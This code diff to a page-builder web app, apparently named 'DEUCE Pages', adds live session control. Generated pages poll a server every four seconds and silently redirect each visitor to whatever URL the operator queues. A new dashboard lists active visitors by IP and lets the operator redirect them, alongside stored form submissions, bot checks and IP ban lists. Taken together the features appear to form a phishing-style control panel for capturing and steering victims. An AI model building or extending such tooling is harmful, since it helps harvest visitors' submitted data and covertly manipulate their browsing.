@@ -388,6 +388,37 @@ function normalizeUserPage(page) {
   };
 }
 
+function normalizePageResult(result) {
+  const createdAt = result.createdAt || result.date || new Date().toISOString();
+  const date = new Date(createdAt);
+  const payload = result.payload || result.fields || {};
+  return {
+    ...result,
+    status: result.status || "New",
+    screen: result.screen || result.pageId || "Page",
+    fields: payload,
+    ip: result.ip || "unknown",
+    date: Number.isNaN(date.getTime()) ? "--" : date.toLocaleDateString(),
+    time: Number.isNaN(date.getTime()) ? "--" : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })
+  };
+}
+
+async function loadResultsControlData(page) {
+  try {
+    const [resultsData, sessionsData] = await Promise.all([
+      requestApi(`/api/user-pages/${page.id}/results`),
+      requestApi(`/api/user-pages/${page.id}/sessions`)
+    ]);
+    const results = (resultsData.results || []).map(normalizePageResult);
+    page.results = results;
+    page.activeSessions = sessionsData.sessions || [];
+    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions } : item);
+  } catch (error) {
+    statusText.textContent = `RESULTS LOAD WARNING: ${error.message}`.toUpperCase();
+  }
+  return page;
+}
+
 async function loadAppData() {
   apiLoadError = "";
   try {
@@ -761,6 +792,7 @@ function createGeneratedIndex(page) {
       resultEndpoint: `${runtimeApiBase}/results`,
       trafficEndpoint: `${runtimeApiBase}/traffic`,
       securityEndpoint: `${runtimeApiBase}/security/check`,
+      commandEndpoint: `${runtimeApiBase}/session-command`,
       turnstileEndpoint: `${runtimeApiBase}/verify-human`
     },
     screens
@@ -987,6 +1019,22 @@ function createGeneratedIndex(page) {
           console.info("DEUCE Pages traffic payload queued for Render API", payload);
         });
       }
+
+      function checkSessionCommand() {
+        const commandUrl = config.runtime.commandEndpoint || endpoint("/api/runtime/session-command");
+        const params = new URLSearchParams({ userPageId: config.id, sessionId });
+        fetch(\`\${commandUrl}?\${params.toString()}\`)
+          .then((response) => response.ok ? response.json() : null)
+          .then((data) => {
+            const command = data && data.command;
+            if (command && command.action === "redirect" && command.targetUrl) {
+              window.location.href = command.targetUrl;
+            }
+          })
+          .catch(() => {});
+      }
+
+      window.setInterval(checkSessionCommand, 4000);
 
       function fieldsFor(screen) {
         return String(screen.config.fields || "")
@@ -2892,14 +2940,17 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
   topbarTitle.textContent = `${page.name} Security`;
 }
 
-function renderResultsCenter(pageSlug = "page-a") {
+async function renderResultsCenter(pageSlug = "page-a") {
   activeFlowSlug = null;
   const page = getPageBySlug(pageSlug);
   if (!page) {
     renderMissingPage();
     return;
   }
+  await loadResultsControlData(page);
   const results = page.results || [];
+  const activeSessions = page.activeSessions || [];
+  const sessionCommands = page.configs?.sessionCommands || {};
   const bannedIps = page.securityConfig?.bannedIps || [];
   const whitelistIps = page.securityConfig?.whitelistIps || [];
 
@@ -2908,7 +2959,7 @@ function renderResultsCenter(pageSlug = "page-a") {
       <div class="view-heading">
         <small>page results</small>
         <h2>${page.name} submissions</h2>
-        <p>Review submitted details for this page, remove unwanted records, or send visitor IPs straight into the page security rules.</p>
+        <p>Watch active visitors on this page, redirect a live session when needed, and manage saved submissions without leaving the page workspace.</p>
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
@@ -2917,11 +2968,52 @@ function renderResultsCenter(pageSlug = "page-a") {
       ])}
 
       <div class="summary-grid">
+        <article><small>Active users</small><b>${String(activeSessions.length).padStart(2, "0")}</b><span>Seen in last 10 minutes</span></article>
         <article><small>Total results</small><b>${String(results.length).padStart(2, "0")}</b><span>Saved for ${page.name}</span></article>
-        <article><small>New</small><b>${String(results.filter((item) => item.status === "New").length).padStart(2, "0")}</b><span>Needs review</span></article>
         <article><small>Banned IPs</small><b>${String(bannedIps.length).padStart(2, "0")}</b><span>Security list</span></article>
         <article><small>Whitelisted</small><b>${String(whitelistIps.length).padStart(2, "0")}</b><span>Trusted list</span></article>
       </div>
+
+      <article class="security-panel active-users-panel">
+        <div class="builder-heading">
+          <div>
+            <small>live users</small>
+            <h3>Active page sessions</h3>
+          </div>
+          <button type="button" data-route="#security-${page.slug}:traffic">Open traffic</button>
+        </div>
+        <div class="active-session-list">
+          ${activeSessions.length ? activeSessions.map((session) => {
+            const command = sessionCommands[session.sessionId];
+            return `
+              <article class="active-session-card">
+                <div>
+                  <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
+                  <h4>${escapeHtml(session.ip || "unknown")}</h4>
+                  <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
+                </div>
+                <div class="session-meta">
+                  <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
+                  <span>${command?.targetUrl ? `Queued: ${escapeHtml(command.targetUrl)}` : "No command"}</span>
+                </div>
+                <div class="session-command">
+                  <input type="url" placeholder="https://target-page.com" value="${escapeHtml(command?.targetUrl || "")}" data-session-target="${escapeHtml(session.sessionId)}">
+                  <button type="button" data-session-redirect="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Redirect</button>
+                  <button type="button" data-session-clear="${escapeHtml(session.sessionId)}" data-session-page="${escapeHtml(page.slug)}">Clear</button>
+                </div>
+              </article>
+            `;
+          }).join("") : `
+            <article class="active-session-card empty-session">
+              <div>
+                <small>idle</small>
+                <h4>No active users right now</h4>
+                <p>Open the live page and keep it active; sessions appear here from recent traffic events.</p>
+              </div>
+            </article>
+          `}
+        </div>
+      </article>
 
       <div class="results-list">
         ${results.length ? results.map((result) => `
@@ -3841,6 +3933,51 @@ preview.addEventListener("click", async (event) => {
     return;
   }
 
+  const sessionRedirectButton = event.target.closest("[data-session-redirect]");
+  if (sessionRedirectButton) {
+    const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
+    const sessionId = sessionRedirectButton.dataset.sessionRedirect;
+    const targetField = [...preview.querySelectorAll("[data-session-target]")]
+      .find((field) => field.dataset.sessionTarget === sessionId);
+    const targetUrl = targetField?.value.trim() || "";
+    if (!resultPage || !targetUrl) {
+      statusText.textContent = "REDIRECT TARGET REQUIRED";
+      return;
+    }
+    try {
+      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
+        method: "POST",
+        body: JSON.stringify({ targetUrl })
+      });
+      const updated = normalizeUserPage(result.userPage);
+      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
+      await renderResultsCenter(updated.slug);
+      statusText.textContent = "LIVE USER REDIRECT QUEUED";
+    } catch (error) {
+      statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
+    }
+    return;
+  }
+
+  const sessionClearButton = event.target.closest("[data-session-clear]");
+  if (sessionClearButton) {
+    const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
+    const sessionId = sessionClearButton.dataset.sessionClear;
+    if (!resultPage) return;
+    try {
+      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
+        method: "DELETE"
+      });
+      const updated = normalizeUserPage(result.userPage);
+      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
+      await renderResultsCenter(updated.slug);
+      statusText.textContent = "LIVE USER COMMAND CLEARED";
+    } catch (error) {
+      statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
+    }
+    return;
+  }
+
   const resultAction = event.target.closest("[data-result-page]");
   if (resultAction) {
     const resultPage = getPageBySlug(resultAction.dataset.resultPage);
@@ -3854,27 +3991,31 @@ preview.addEventListener("click", async (event) => {
     }
 
     if (resultAction.dataset.deleteResult) {
+      await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
       resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
-      saveFlowState(resultPage);
-      renderResultsCenter(resultPage.slug);
+      await renderResultsCenter(resultPage.slug);
       statusText.textContent = "RESULT DELETED";
       return;
     }
 
     if (resultAction.dataset.banResultIp) {
-      resultPage.securityConfig.bannedIps = Array.from(new Set([...(resultPage.securityConfig.bannedIps || []), result.ip]));
-      resultPage.securityConfig.whitelistIps = (resultPage.securityConfig.whitelistIps || []).filter((ip) => ip !== result.ip);
-      saveFlowState(resultPage);
-      renderResultsCenter(resultPage.slug);
+      const updated = await requestApi(`/api/user-pages/${resultPage.id}/ban-ip`, {
+        method: "POST",
+        body: JSON.stringify({ ip: result.ip })
+      });
+      resultPage.securityConfig = updated.securityConfig || resultPage.securityConfig;
+      await renderResultsCenter(resultPage.slug);
       statusText.textContent = `${result.ip} BANNED`;
       return;
     }
 
     if (resultAction.dataset.whitelistResultIp) {
-      resultPage.securityConfig.whitelistIps = Array.from(new Set([...(resultPage.securityConfig.whitelistIps || []), result.ip]));
-      resultPage.securityConfig.bannedIps = (resultPage.securityConfig.bannedIps || []).filter((ip) => ip !== result.ip);
-      saveFlowState(resultPage);
-      renderResultsCenter(resultPage.slug);
+      const updated = await requestApi(`/api/user-pages/${resultPage.id}/whitelist-ip`, {
+        method: "POST",
+        body: JSON.stringify({ ip: result.ip })
+      });
+      resultPage.securityConfig = updated.securityConfig || resultPage.securityConfig;
+      await renderResultsCenter(resultPage.slug);
       statusText.textContent = `${result.ip} WHITELISTED`;
       return;
     }
